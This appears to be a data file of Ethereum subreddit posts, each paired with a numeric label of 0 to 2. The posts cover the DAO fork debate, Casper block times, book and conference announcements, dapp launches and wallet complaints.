i'm amazed... while a lot of you are complaining about crypto prices going down, i see thousands of developers quietly developing the different pieces of a puzzle that will soon be complete. if you believe in decentralization, don’t give up, be patient and spread the word about great crypto projects instead of just talking about the price with your friends. we are participating in a unique adventure and i’m proud of that. *disclaimer: i own some the tokens that i mentioned but i don’t want this to appear as a shill post.*	2

i want to know its state. is anyone still developing this? do we have a working app? edit: oops, seems like it is actually $100b. (and i should've suspected $10b was too low.)	2

two exciting years. here's to many more!	2
i personally believe that the soft fork that has been proposed to lock up the ether inside the dao to block the attack is, on balance, a good idea, and i personally, on balance, support it, and i support the fork being developed and encourage miners to upgrade to a client version that supports the fork. that said, i recognize that there are very heavy arguments on both sides, and that either direction would have seen very heavy opposition; i personally had many messages in the hour after the fork advising me on courses of action and, at the time, a substantial majority lay in favor of taking positive action. the fortunate fact that an actual rollback of transactions that would have substantially inconvenienced users and exchanges was not necessary further weighed in that direction. many others, including inside the foundation, find the balance of arguments laying in the other direction; i will not attempt to prevent or discourage them from speaking their minds including in public forums, or even from lobbying miners to resist the soft fork. i steadfastly refuse to villify anyone who is taking the opposite side from me on this particular issue. miners also have a choice in this regard in the pro-fork direction: ethcore's parity client has [implemented a pull request for the soft fork](https://github.com/ethcore/parity/pull/1309) already, and miners are free to download and run it. we need more client diversity in any case; **that** is how we secure the network's ongoing decentralization, not by means of a centralized individual or company or foundation unilaterally deciding to adhere or not adhere to particular political principles.	1
i'm proud as a peacock right now, so i just wanted to share. i spent my free time learning solidity and react the past few weeks, and finally managed to deploy my first decentralized application. if you want to start building, please just start now! it's a lot of fun, and a super rewarding experience. here is the material i used to build [lovers4.life](http://lovers4.life) : - [udemy solidity & web3 course](https://www.udemy.com/ethereum-and-solidity-the-complete-developers-guide/learn/v4/overview) - [udemy react course](https://www.udemy.com/react-2nd-edition/learn/v4/overview) - [react boilerplate](https://github.com/zeit/next.js/) - [react frontend framework](https://react.semantic-ui.com/introduction) - [react animations](https://github.com/drcmda/react-spring) - [hosting](https://www.digitalocean.com) just a little disclaimer; i did not start from scratch with programming. i've been a hobby programmer for a few years. really looking forward to building more complex and useful dapps. big thanks to the community here, you guys are amazing for providing resources and news.	2

hey guys, wanted to inform you all of a project that not many people know of called the get protocol (www.guts.tickets) and what it is actually achieving for us tech heads as their tech is being used for a bunch of events throughout the netherlands and by the end of the year over 50,000 people will have ethereum wallets and far far more by the end of 2019. it's been in development for over two years by guts, a team in the netherlands working to make ticket scalping impossible using smart tickets. in fact here's a picture of a theatre audience, each and every one of them (about 1k people) received an ethereum wallet in the background that day and they had no idea which in my mind is the real path to consumer adoption, we let the blockchain be the engine that drives the end product as the end user should never need to know that blockchain exists! by the end of next year they reckon they will have sold 1 million tickets all registered and state changed through the ethereum blockchain using the get cryptocurrency also. https://imgur.com/a/ppxuvsr if you want to, you can check out some of the event ticket states that are being recorded onto the ethereum blockchain: * [etherscan ownership changes for their f1 show in heerhugowaard](https://kovan.etherscan.io/address/0xd5d8bb4717d008a74029cf0b5dc6d8a58f52cbad) * [etherscan ownership changes for their f1 show in uden] (https://kovan.etherscan.io/address/0x3fde867fffa20caa05326716e161618aea77d464) * [etherscan ownership changes for their f1 show in cuijk](https://kovan.etherscan.io/address/0xab07458a37f9e8ff6ff37bfcdc06c0daf603e16f) there are a bunch more but thought that would be enough to show you guys, it's cool also because people later this year will also be getting some cryptocurrency behind the scenes too with get which essentially powers the get protocol. anyways, if you are interested in learning more about why i believe consumer adoption requires us to shift our view point on how the blockchain needs to integrate into projects and why the get protocol does a good job of this then my article is here: https://medium.com/@colbymort/the-get-protocol-cracking-mainstream-adoption-by-making-blockchain-not-so-scary-988c584120c6 thanks :)	1
i'm a big believer in the future of ethereum and a very long-term holder. however i have to say i'm very disappointed in mist wallet. when i first downloaded it in january of 2016 i was not surprised that there were many bugs/glitches and that it would freeze constantly, as this was early-stage software. however here we are three years later and i still can't get my mist wallet to run. i use mew, but i want to check on the ens domains i own, and can only do so by accessing mist. when i run mist it just overheats my computer and freezes after 15 minutes or so every time. this is with no other applications running. i actually would have bid on more ens domains if this hadn't been such an issue. does anyone else deal with this same issue? are there any solutions being proposed to improve the utterly terrible ux of mist? the fact that an unfunded third party (mew) can put together such a vastly superior product than the ethereum foundation with hundreds of millions in funding is, to be honest, concerning to me.	1

i always use this phrase to explain people the difference between bitcoin and ethereum. then, i explain that bitcoin was created as a digital currency and ethereum as a medium to create decentralized applications. how do you guys explain other people with little to no background on cryptos ?	1
"bitcoin had a fair launch. anyone who knew about bitcoin and had access to a pc could mine from day 1. over time, mining became more difficult but people could easily buy btc on various exchanges or from other people who had bitcoin. you didn't have to be a member of a privileged class to get into bitcoin at the ground floor. ethereum had a fair launch. unlike bitcoin, the project was far too ambitious for the people who conceived of it to pay for its development out of pocket. so they held an open crowd funding to pay for development. anyone who heard about ethereum could participate in the crowdsale, priced at about 30 cents/eth. after the chain launched, anyone with a modern graphics card could also mine ether and put some away. some founders on the team didn't care for that funding model for ethereum. they wanted ethereum to be funded by insiders and vcs and held private for a long time. some even left the project, or were encouraged to leave, over the difference in vision between an open community non-profit project, and a vc-held and vc-controlled for-profit organization. and of course both bitcoin and ethereum are open-source projects with licenses that encourage the ability to copy, rework, and reuse the project code. these days there are lots of ethereum ""killers"", eth 2.0 ""killers"" and eth competitors launching and planned for launch. for the most part, they do not adhere to the bitcoin or the ethereum open participation models. some are closed-source, copyrighted projects. almost all were and are funded by vcs and the wealthy via safts, often through secret deals where price and amount of tokens are not disclosed. the public is generally not allowed to participate until the tokens get marked up 5x, 10x or 100x before an exchange listing. so you will end up with the vast majority of tokens owned by a very few, already very wealthy people. but a radically unjust token distribution isn't all that these new ""ethereum killers"" have. no, they also are, almost to the last, designed around plutocratic governance. that is, if you are one of vcs, the insiders and wealthy allowed to buy in early before the marking up to retail, you will have orders of magnitude more tokens and therefore you will have orders of magnitude more control over future changes to blockchain rules than the hoi polloi. some even see this kind of governance as a feature and a good thing. i disagree emphatically! ethereum was an open, community-supported launch organized by a non-profit entity. it is today an open and community-participatory project. there are no fees to attach your application to ethereum, other than gas costs. the blockchain is permissionless, no plutocracy can ""vote you off the island"". ethereum is not run by rich vcs and ""accredited investors"" who got in on the ground floor when you couldn't. i do hope that ethereum wins out. i think there is an enormous difference between an open community project and almost all of the competitors who launched after. i do not want the future of humanity's financial internet to be based on plutocratic control by the fabulously wealthy. how would that be one bit better than the existing financial system? if making these observations, if hoping that ethereum becomes the global financial commons, instead of a pluto-chain taking over, makes me a narrow-minded ethereum maximalist, so be it."	2
"not sure how this news isn't piquing more interest: https://www.rgj.com/story/money/business/2018/01/23/industrial-park-houses-tesla-gigafactory-nearly-sold-out-after-blockchains-deal/1059002001/ some interesting/weird facts: * ~**65,000 acres** purchased by **blockchains llc**, paid in cash. that is 20x the land holdings of their new neighbors (tesla's gigafactory @ 3,000 acres, google @ 1,200 acres). * tahoe reno industrial center's [website](http://tahoereno.com/sites/) lists land price at $2.25/sf which would be ~$100,000/acre. this would be imply $6.5 billion paid, however if you compare to previous discounts (i.e. [google's discount](https://www.rgj.com/story/money/business/2017/04/17/google-buys-land-near-tesla-gigafactory-east-reno-data-center-technobubble/100566250/)) of ~1/4 of that, it's safe to say **$1 billion** is a ballpark number for the final price paid. * [blockchains llc's](https://www.blockchains.com/)'s apparently new website is rather barren, with no clear indication of what they actually do, except for running [ethnews.com](https://www.ethnews.com/) and creating distributed apps on the **ethereum** blockchain. their [linkedin company page](https://www.linkedin.com/search/results/people/?facetcurrentcompany=%5b%2211430130%22%5d) only shows 10 employees, led by a jeffrey berns (ceo) and david berns (coo). not to mention that ""blockchains llc"" sounds a lot like an impersonation company name. * david berns is also the cfo of [berns inc](http://www.bernsinc.com/), which ""creates software using blockchain-based technology."" its a small company with only 9 people, 5 of which are developers. most of the people working for berns inc overlap with blockchains llc, and i wouldn't be surprised if blockchains llc is just a subsidiary of berns inc * jeffrey berns and david berns are also partners at [bernsweiss llp](https://www.law111.com/) law firm, which is a ""virtual currency class action practice"" maybe i'm not aware of these companies footprint on the ethereum ecosystem, but to me its weird that a relatively unknown company has $1 billion cash to drop on *land only*, with no clear indication about what they're going to use it for besides 150 acres for a ""campus park that will house the company's headquarters"". for 10 people?! anyone have any more information on this?"	0

we are gav wood (/u/gavofyork), founder of ethereum, and andreas m. antonopoulos (/u/andreasma), author of *mastering bitcoin* and *the internet of money*. we are writing *mastering ethereum* under contract with o'reilly media, with a planned publication date in q1'2018. *mastering ethereum* is intended as a book for developers, outlining what ethereum is, how it works and how to write smart contracts and dapps. we are especially interested in finding out what you are most interested in learning from this book. the book is being developed collaboratively, and open source, on [github](https://github.com/ethereumbook/ethereumbook). upon completion, the book will be released as a paperback and ebook on all major publishing platforms. it will also be available to read and share for free under a cc-by-nc-nd creative commons license. within a year of the paperback publication, we expect to relax the license to cc-by-sa, to allow derivative, translation and commercial work. we welcome community contributions, additions, comments and corrections, as well as code samples. contributors can add their name (and/or github id) to the preface as acknowledgment of their contributions please ask anything about the book, about the authors or about how to contribute/collaborate. **edit: we've answered as many questions as we could handle. thank you all for your excellent questions, your kind words and your support! follow the [github](https://github.com/ethereumbook/ethereumbook) repo to see the book develop and contribute, read, comment, correct!** the book cover: http://imgur.com/a/6mha9	1
so i found a bit of time over christmas break to experiment with confidential transactions. i finally have a working prototype for a ct token on ropsten ([link](https://ropsten.etherscan.io/address/0xeace8fbe35577a892a01a05220deac93af9af0ce#code)). i probably won't be devoting much more time to it, but i thought it was cathartic to get something out there. if anyone wants to experiment with it, i have some test vectors that i published on pastebin ([link](https://pastebin.com/dtxqjgyy)). i also wrote a small, albeit incredibly dirty and undocumented, python script to help generate ct range proofs ([link](https://pastebin.com/ms0erygw)). one may or may not find that useful. overall the gas is not the greatest, but it is workable. i sent a ct which proved two pedersen commitments of 3-bits (base4) a power of 17 and an offset of 0 wei. these each covered a number in the range from 0.0 to 6.4 eth in 0.1eth increments. i also then withdrew one of the new ct outputs for 0.2eth (thus revealing what it was). this took about 2,000,000 gas, plus another 100,000 for the final withdraw. i apologize in advance for the rough spots in the contract and the documentation. hopefully some project finds this useful. looking forward to when this tech goes mainstream!	1
so wasn't devcon3 awesome? great job, everyone at the ethereum foundation and volunteers and presenters and everyone else who had a hand in this amazing event. and at such scale too :-) i had a fantastic time and i am sure that the same is true of the other attendees. so many great conversations. so many potential future collaborations initiated and friendships made. i got to meet many people who i had still never ever met in irl, despite having known them 2+ years online. as a technology and as a community we are a world further forward than we were a year ago. it is fantastic to see so much progress and such a wealth of great projects ongoing. by #devcon4 i am sure that ethereum will be leaps-and-bounds forward again. adoption is rampant. bravo again to everyone who facilitated this fantastic irl fiesta 🦄	0

for all its evangelists, blockchain technology certainly gets a lot of hate. and not just amongst the computer illiterate. tech savvy places like hackernews have a very anti-blockchain sentiment. while i am a believer in the utility of blockchain technologies, even i have my skepticism. it makes me wonder... were people this skeptical of the internet's potential back in its early days? the internet turned out to be a ~pretty big deal~. were people worried that it wouldn't?	1
we (asseth) were delighted by the wonderful feedback we had after edcon paris in feb 2017. after speaking to representatives of the ethereum community in amsterdam, berlin, london and rome it appeared that the desire for a major recurring ethereum event in europe was very strong. so here here it is: #ethcc - ethereum community conference ##where and when? ###⮕ [ethcc](http://ethcc.io/) will take place in paris at the conservatoire nationale des arts et métiers (cnam) on 8th, 9th and 10th march 2018. the venue is an engeneering school a [museum](http://www.arts-et-metiers.net/les-collections) dedicated to innovation and technology. ethcc talks will be spread accross 4 amphitheaters allowing for multiple streams (scalability, anonymity, development tools, governance, compliance...) and longer duration than usual. ##who is organizing ethcc? ### ⮕ [asseth](https://www.asseth.fr) is the organizer with the support of the ethereum foundation and the cnam. asseth is a regulated french non-profit organization. it hosts free ethereum workshops several times a month since early 2016, feeds the [ethereum-france website](https://www.ethereum-france.com) and translates technical papers in french (see [here](https://www.ethereum-france.com/livre-blanc-white-paper-ethereum-traduction-francaise/), [here](https://www.ethereum-france.com/yellow-paper-ethereum-livre-jaune-traduction-complete/), [here](https://www.ethereum-france.com/%ef%bb%bfethereum-2-0-mauve-paper-traduction-francaise/) and [there](https://www.ethereum-france.com/quest-ce-que-la-fragmentation-ou-sharding-faq-par-v-buterin-traduction/) ). asseth also participates to various educational projects and [open-source projects](https://github.com/asseth/). although the tickets will be sold at cost, any eventual benefits will be allocated in future workshops and community projects. ##why should you attend ethcc? ### ⮕ it's a unique occasion to learn what is happening on ethereum directly from the actors working on the latest development! the multiple streams will fit different areas of interest and we are also planning hands-on workshops. the location is in the center of paris and we will soon publish a new [crypto guide to paris](https://meta.ethereum.stackexchange.com/questions/407/edcon-a-cryptofriendly-guide-to-paris) ! asseth will set up events the days before the event for people coming in advance. ##confirmed speakers/attendees: nick johnson, martin becze, aron fischer, frankie pangilinan, makoto inoue, raine revere, thomas bertani, andres junge, jordi baylina, griff green, clément lesaege, thibaut schaeffer, raphael mazet, rick dudley, josh stark, nicolas bacca, ashley tyson, robbie bent, vincent eli, simon polrot, jerome de tychey, jenna zenk, jutta steiner, will king, jack spallone, daniel nagy, hudson jameson, dimitry khoklov, rob stupay, yann levreau, james pitts, andrei maiboroda, vanessa grellet... and many more to be announced we are looking forward to seeing you all in march <3 should you have any question don't hesitate to reach out to us [contact@asseth.fr]	2
"1) three months ago i made [a statement](https://backchannel.com/the-uncanny-mind-that-built-ethereum-9b448dc9d14f#.5e1mm1fcj) in an interview with morgen peck as follows: > i generally support just about every secession attempt that comes along,” he says. “if in the future there is that kind of a dispute in ethereum, i’d definitely be quite happy to see ethereum a go in one direction and ethereum b go the other. i **do** have principles, and this is a principle that i have so far held consistently. it would of course be grossly hypocritical for me to (correctly) [decry bitcoin maximalism](https://blog.ethereum.org/2014/11/20/bitcoin-maximalism-currency-platform-network-effects/) back in 2014, and then start shouting ""one chain to rule them all! network effects!"" the moment it becomes suitable to me. rather, i believe, just as i had stated [in my 2014 post on silos](https://blog.ethereum.org/2014/12/31/silos/), that: > if there truly is one consensus mechanism that is best, why should we not have a large merger between the various projects, come up with the best kind of decentralized computer to push forward as a basis for the crypto-economy, and move forward together under one unified system? in some respects, this seems noble; “fragmentation” certainly has undesirable properties, and it is natural to see “working together” as a good thing. in reality, however, while more cooperation is certainly useful, and this blog post will later describe how and why, desires for extreme consolidation or winner-take-all are to a large degree **exactly wrong** – not only is fragmentation not all that bad, but rather it’s inevitable, and arguably the only way that this space can reasonably prosper. i personally admittedly find etc's social contract, community and raison d'être less exciting and satisfying and would not personally feel the same passion for it that i do for eth, but this is simply my judgement, and the judgement of the very many members of the community that have voted or otherwise expressed assent to the fork. anyone who feels sufficiently strongly in the other direction is welcome to focus on the etc chain, and we will see if it remains viable. 2) but those were just my beliefs and intermediate values. how do we know that this ""let a hundred flowers bloom"" position is actually correct? we can actually discover a lot of facts from the current situation. first of all, though we can see that the price of eth + etc has been remarkably stable around $14.3 for the past 2.5 days, despite great volatility in each component. this is still early-stage, but suggests that the value of at least the cryptocurrency component of the ecosystem actually isn't a superlinear function that favors monopoly. second, we can see from several sources (including exchange order books, but also public pronouncements [from barry silbert](https://twitter.com/barrysilbert/status/757628841938472961) et al) that incoming interest into etc is actually coming from the bitcoin side even more than it is from the ethereum side. and this is a core tenet of blockchain pluralism: by leaving open an option to join an alternate system if an individual so chooses, you can satisfy the varying needs of larger groups of people. 3) i may as well offer my own views on hard forking. i **do not** believe that using hard forks as a primary paradigm to resolve thefts or to deal with unethical applications is a long-term viable strategy. this time, we got very lucky that the stolen dao eth were conveniently stuck in a known address for 35 days. next time around, the funds will likely be being sold on exchanges before the developers even know it, and the only solution will be a rollback - and casper will make rollbacks infeasible due to its economic finality mechanism in any case. 3b) ""evil dapps"" can constantly move their contracts around in ways that evade a necessarily slow-moving hard fork, so while we can annoy them, ""softer"" means of mitigating the harm of such applications must necessarily still be sought out. 3c) the blockchain itself is very far from the eventual vision of a hyper-scalable, efficient and secure world computer and will see several more iterations to move closer to that goal; if you wish you may view casper as a completely independent blockchain that happens to have a 100% state-copying premine from eth, and in fact this may even be the cleanest way to implement it in code. i personally was okay with a fork in light of this context, together with a philosophical belief that **a principle does not need to have literally infinite weight in order to have value**. in the near to mid-term future, i expect that there will be many small applications rather than one big application, and so no single failure will be enough to greatly impact the ecosystem; hence it strikes me as quite unlikely that application rescue hard forks will become a regular thing (note that some disagree; vlad would love to have hard forks for many more things, though i'll let him defend his own views :) ) at this point, i am hypothetically open to two kinds of application rescue hard forks: i) a fork in the very unlikely case that the solidity compiler proves to have a serious bug that puts 5-10 million eth in danger. ii) there has been a medium amount of ether that has been sent to unspendable addresses because users were using buggy ethereum-js libraries that created the address from the public key incorrectly. i would be ok with a change, for example as part of metropolis, that adds a new transaction type that effectively makes the most common categories of such unspendable addresses spendable by their cryptographically provable rightful owners (but i would only be ok with this with broad consensus and even still it's dependent on technical feasibility and tradeoffs in code complexity). in the future, i suspect that both possibilities will recede over time. 3d) in the short and medium term, we are still under conditions of high technical uncertainty. for example, vlad and i continue to argue about whether or not a fixed currency supply can offer sufficient incentives through transaction fees alone to secure the network. if we had agreed, for example, to a ""100 million eth and never a single bit more"" principle on day one, we would have dug ourselves into a rather deep hole if the research ends up showing that low inflation (or something more complex, like _expected_ low deflation but the possibility of low inflation under conditions of low casper participation) is the only safe way forward. similarly, ""it is possible to create a contract that lasts forever"" is also something that is economically dangerous to commit to. hence, principles on these kinds of matters may need to be settled only later. 4) concerns about moral hazard are, in this case, imo overblown; on the contrary, despite the fork, i have been extremely impressed by the sheer number of formal verification and other secure contract programming projects that have recently emerged in academia. writing this from inside the middle of an ethereum research workshop in cornell, i am very optimistic that the number of bugs in code will decrease greatly over the next year. 4b) this does however mean that there is now a much larger burden on high-level language developers, and i personally do not have the time or ability to maintain serpent at a level that i personally find satisfactory. i am personally continuing to use it as a language for experimenting with casper simulations, but i welcome proposals from the community for how and if it can find a niche in other contexts."	1
i don't see how this will negatively effect anyone if its slipped into the constantinople hardfork. parity looks like shit right now, but these are the early days, and this wont be the last time this happens. the sooner we accept this and decide that as a community we support fixing major issues/bugs/fuck-ups like this (when its safe and easy to do so of course), the sooner we can progress past the negative stigma people have over hardforks that hinders our growth as a whole.	1
what's special about it: &#x200b; unlike most other content dapps like steemit, dtube, peepeth, bitchute, etc, it does not have a web server layer at all. it runs as a standalone html file on your computer and queries ethereum directly, which means that even if your content is banned across all web hosting services on the planet, your subscribers will still receive it in their browser. &#x200b; how it works: &#x200b; 1. a content creator publishes a piece of content online (e.g. youtube, torrent, etc.) 2. they broadcast a link to this content on the ethereum network for a small fee (approx. 5c worth of gas) 3. their subscribers get it on their newsfeed directly from ethereum for free. &#x200b; the newsfeed algorithm is 100% smart contracts, so your subscribers are guaranteed to get all your posts sorted by most recent, forever. &#x200b; supported content: &#x200b; \- youtube embeds \- vimeo embeds \- reddit embeds \- facebook embeds \- ipfs \- torrents \- web torrents \- direct links to jpg, jpeg, png, gif, webm, mp4, ogg, wav, mp3, flac &#x200b; here's a profile: [https://subby.io/?u=cats](https://subby.io/?u=cats) &#x200b; here's some screenshots: [subscribe](https://reddit.com/link/9ux6x4/video/ykggkj7mvuw11/player) [publish](https://reddit.com/link/9ux6x4/video/zfze5l6ovuw11/player) [create profile](https://reddit.com/link/9ux6x4/video/ars9bq2qvuw11/player) [donate](https://reddit.com/link/9ux6x4/video/dxj9ffsrvuw11/player) [supported content](https://reddit.com/link/9ux6x4/video/f06njbmawuw11/player)	2
what gives ethereum momentum and a brighter future? it has more core devs working on it than any other currency. it's time to get familiar with the progress the teams are making across repos: [https://blockmodo.com/quotes/eth/code](https://blockmodo.com/quotes/eth/code) give thanks!	2
just did another eth transaction again. i was stunned by the transaction confirmation speed. less than 35 sec. boom! confirmed. is this real? faster than bch, never see ltc on that lightning move, faster lota ever in record, and never see btc transact on that kind of speed...anybody? my jaw wide open with suspicious seeing thing.	1
sorry for not being very responsive in social media, we had some very challenging days. i want to publicly apologize that i didn't find that bug in the dao framework 1.0 which was used by the dao. i can honestly say, that i gave my best, open sourced the code and approached as many knowledgeable persons that i could find to review it, but it was not enough. we have learned a lot through this, and are paying a high price. we are dedicated to do all that is in our power to assist the dao to recover the funds. please support the upcoming fork. the work done by geth, ethcore, consensys and many individuals show that as a community we are able to come together and coordinate complex solutions to difficult situations. i know there are and will be a lot of discussions in this and related threads. i am currently unable to respond to everything because i am working on solutions (https://blog.slock.it/what-the-fork-really-means-6fe573ac31dd#.s4vxq4ryp).	0
yes, scalability is a major problem for any blockchain, and yes, ethereum has a scalability roadmap but still, i didn't think we'd come to this point this soon. basically, the recent bancor and bat icos made the entire blockchain unusable for 3 hours unless you paid extremely high fees. this is just unacceptable. think about it: rwe for example uses the public ethereum chain to manage payments for ev charging. if you want to charge your car and suddenly end up in an ico, you actually have to wait for a few hours for the ico to complete. this is a huge issue to me. seriously. we need scaling features yesterday! edit: oh hai, vlad. rip thread i guess: https://twitter.com/vladzamfir/status/874498649555861504	1

please note that this decision to postpone the constantinople hard fork was done so out of caution and respect for the integrity of the ethereum ecosystem and its community. without enough time to analyse the potential impact of the vulnerability, it made ethical sense to stick to the side of caution and to call off committing to an eip that could potentially put user funds at risk. the ethereum core developers had the opportunity here to sweep this issue under the rug and commit to the constantinople hard fork, as planned, however, i am thoroughly impressed by the virtue that was exercised in this decision to postpone the constantinople hard fork. this is a perfect demonstration of the development force behind ethereum possessing a strong sense of probity. edit: here is my personal audio log of emergency ethereum core dev meeting held regarding this matter (this meeting was open to the public), my mic was muted in the meeting but unfortunately not in my recording, sorry if my clicking drives you crazy but i felt it was still worth sharing this here: https://soundcloud.com/revolution0x/constantinople-hardfork-meeting-audio	2
a lot of mindless posts from the moon crowd. we are supposed to be ahead of the curve here, so how about some intellectual conversation? i'll start. so if the world economy becomes majority cryptocurrencies, how extreme do you think the move will be towards an entire united earth? with a global, transferable currency that moves peer to peer; i would imagine that lots of cross border relationships will be built that could have never found each other before. i see this as the first major step towards a united human race versus each country for their own. if that takes hold, what are some future use cases for a platform such as a ethereum (other than dapps that are currently being developed). in what ways could you think of solving global issues that are hard to solve with our current divided economies? i love eth, and there are some wonderful minds working on projects, but as always more ideas create new innovation. instead of discussing current prices and moon landings, we should be discussing potential use and get involved with our devs. if we continuously brainstorm, the people with the know how may be inspired? thanks 😁	0
"millions of dollars have been lost by everyday users since the beginning of time on the ethereum blockchain. broken contracts, lost private keys, sending to wrong addresses, are just some ways that users have lost funds. none of these users ""intended"" for these losses to happen. just like the parity multisig contract wasn't 'intended' to self destruct. i am truly sympathetic to all the users affected by this bug. but it seems that the only fair course of action here would be an eip that includes a full bailout of all losses on the ethereum network since the genesis block. it seems to me unfair that only certain contracts should be fixed and not others. the most upsetting thing about this bailout request is that it does not include losses from the the parity wallet blank seed phrase bug (not the multisig contract) which resulted in tens of millions of dollars of losses to parity wallet users who were never compensated by parity. parity never bailed out their own users, but a few months later when they lose their own money that they cried foul and asked for a bailout from everyone else. that just isn't fair. if parity wants to receive the goodwill of the community and perhaps have more support for this eip, i would suggest updating the eip to include the following: * refunding all losses from their blank seed phrase bug to all users affected. * update the eip to include a bailout from all funds sent to 0x000000000000000000000000000000000000 or other wrong addresses. * restore / fix all bugs in other contracts that have caused losses. when these changes are made so that **everyone is treated fairly**, i think it have more support. other things parity can do to receive more support: * promise to bailout other people's losses with the funds they recover from this eip. (blank seed phrase bug, other broken contracts, 0x0000, etc). * give half the money to the ethereum foundation."	0
i was watching [this video](https://youtu.be/s7ant_59phs?t=968) and then it hit me. bitcoin was a lot more fun when an normal average day user was able to mine it with cpu and gpu. see i have always believed that the concept of crypto currency when embraced globally can lead to a massive redistribution of wealth but not necessarily a more fair one. if anything, the way it is now .. you would easily end up with 10 people owning 99% (hackers and miners) of all bitcoins. so to me there are still things that need to fixed with bitcoin. such as: how to properly distribute this wealth so that enough people want to stay in the system and not go like: it's not fair anymore, this system is also rigged, goodbye. so bitcoin leads to a small rich group of people that are able to mine and make good profit with it and this creates a feedback loop that gives them more and more power to run faster then the rest. that can't be good for decentralization. i want a crypto that: * everybody can always mine and still get at least something out of it, does not have to be much, but something that keeps people involved and interested and not just from a sideline perspective. * an incentive in the form of a reward for actually using it as a currency on a daily basis. maybe a crypto that is build in to an app that people want to use every day? something like bittorrent? bittorrent mainline dth has between 15 and 30 million nodes on-line on a daily basis, it's the most successful and stable and robust decentralized network that i know of (operating on the internet, which is also a robust and stable decentralized network) interesting fact by the way: drue loewenstern inspiration for bittorrent mainline dht came from .... aaron swartz. (if it ever turn out that satoshi was aaron swart, i would not be supprised) * a crypto that can not be hijacked by a small group of people without the rest being able do defend against the attack. * i did not get in to bitcoin because the prospect of staying up all night watching the price go up and down was appealing to me. if anything the whole concept of making money trading stock (because other people loose it) has never appealed to me. now i am not against that, but that's just not for me. but sadly even i got caught up in the gambling. i turned 400 euros in to 4000 euros in the early days of bitfinex and then lost it all when i went short and the price rose to much. one of the ideas that got me in to bitcoin was the idea that everybody in the world with an internet connection would now have equal access to money systems, but that's totally not what bitcoin is right now. i have never really fully understood ethereum. understanding the bitcoin white paper was already hard enough hard enough and took me weeks. i have never put much effort in trying to understand ethereum. so show we what you got! edit: thanks for the discussion and replies. this has been great! time for another let's-lock-myself-in-for-three-weeks-or-longer-untill-i-understand-this-new-idea like i had in 2011 with bitcoin. it was really nice reading all the civilized discussions. made me think about the bitcoin subs before they went to poop.	1

how is that calculated?** there are about [77 million ethers](http://ethereum.stackexchange.com/questions/443/what-is-the-total-supply-of-ether) in existence and every new block (an average of 15 seconds) creates 5 new ether. this number can never be increased, but could be drastically reduced when we [switch to the more cost effective casper consensus algorithm](https://blog.ethereum.org/2015/08/01/introducing-casper-friendly-ghost/). * **what is 'gas'?** every contract has a fixed computational cost that which is the result of which kind of call it executes. these costs are fixed by the protocol level, but to avoid having them fluctuate too much they are set in *gas* instead of *ether*. every user selects the *gas price* they are willing to pay when they send a transaction or execute a contract and every node is free to accept that price or not, based on their minimum gas price, amount of transactions and other network conditions. ## wallet questions **how do i update my wallet?** the wallet is an interface to the node. this means you can have multiple copies of the wallet, or overwrite your old copies without a problem **how do i backup?** open the wallet, go to accounts > backup and save those folders **do i need to download the full blockchain?** yes. light clients are on the pipeline and before that there are some updates that will optimize and speed up the time it takes. **is it safe to store my ether or import my presale wallet?** yes. of course risk is relative and you should keep your computer protected from malware and wallet backed up. the wallet is still beta but at this point this is more related to crashes and other issues that might make it harder for a non geek to launch the wallet. but the chances of actually loss of ether are relatively small at that point and probably smaller than an exchange getting hacked	2

"after an unfortunate delay in the publishing schedule, due to personal issues, ""mastering ethereum"" is now progressing rapidly. ""mastering ethereum"" is an o'reilly media book by andreas m. antonopoulos and gavin wood, aimed at developers. it will be published in q4'2018. the book is currently about 30% done. the book is being developed on github, under a creative-commons license (cc-by-nc-nd). dozens of contributors and readers are already joining me each day to review, comment and contribute content: https://github.com/ethereumbook/ethereumbook contributions and reviews are welcome from readers of all technical levels. if you're new, come and test the examples by trying to apply them yourself. review sections and let me know if they need clarification or more explanation. if you're an experienced ethereum developer, come and suggest new topics, review a section, find bugs! pull requests and issues are most welcome. all contributors will receive attribution (in fact, you can add your own attribution right in the pull request) there's also a gitter chat room where ideas are discussed daily: https://gitter.im/ethereumbook/lobby come on over!"	0
many people are wondering how it is the a 3 second block time can possibly be safe, especially in a context where (i) we are also interested in pushing up our blockchain's tx/sec rate, and (ii) the network latency of the internet is a large fraction of 3 seconds already. this is for good reason; my [previous article on block times](https://blog.ethereum.org/2014/07/11/toward-a-12-second-block-time/) suggested that 12 seconds was safe but not much less. and yet, [this happened](https://twitter.com/vitalikbuterin/status/760185856057638913). in fact, it turns out that the latency was understated: the above 1% stale rate held true even though the average network latency was 2.2 seconds rather than 1.25 seconds (essentially, i set the per-hop latency, but on average nodes in that simulation were ~1.8 hops away) so, what has changed? the answer is simple: proof of stake. in proof of work, block creation is what is called a poisson process - an event that has some very small fixed chance of taking place every millisecond. in a poisson process with a mean block time of 14.3 seconds, once a block is created there is a 6.75% chance that a block will be created in the next second, a 13.05% chance that a block will be created in the next two seconds, etc. this means that, with a mean network latency of ~0.8 seconds (ethereum's [approximate average](http://ethstats.net)), once a block is created there is a ~5.44% chance that another block will be created before that block's miner hears about the first new block, leading to the current stale/uncle rate. casper is not a poisson process. rather, the way it works is that every block creates a random seed from which we generate a sequence of child validators, where after the first 3 seconds the first validator can generate a block, then the second, etc. this has the benefit that as long as everything can happen within the 3-second window, there should be no problems - a latency of 2.2s should not affect the system at all, though a latency of 4s would be very harmful, though not worse than a latency of 4s would be with a 3-second mean block time pow. but we can go further - the above simulation results in fact hold true for network latencies even going all the way up to ~6 seconds (ie. 3.5 seconds per hop). what did we do there? the answer is another clever trick: the time for the primary child of a block to appear with no skips is set to 3 seconds, but the time _between_ skips (ie. the difference between the appearance time of the first and second validator, the second and third, etc) is 6 seconds. so the second validator has to wait 9 seconds to make a block. fortunately, we can expect bonded validators to be online most of the time, and most of the time the 3-second mark is when blocks get created, but the safety margin we have for network latency is based on the time it takes to get to the second validator. this means that, if more safety is deemed desirable, we may even want to adopt a 3/12 formula (ie. first validator after 3s, second after 15s, etc) to double the network latency tolerance with low decreases in average block time. next steps for us: transform the network simulator code into an actual test network running on top of pyethapp.	1

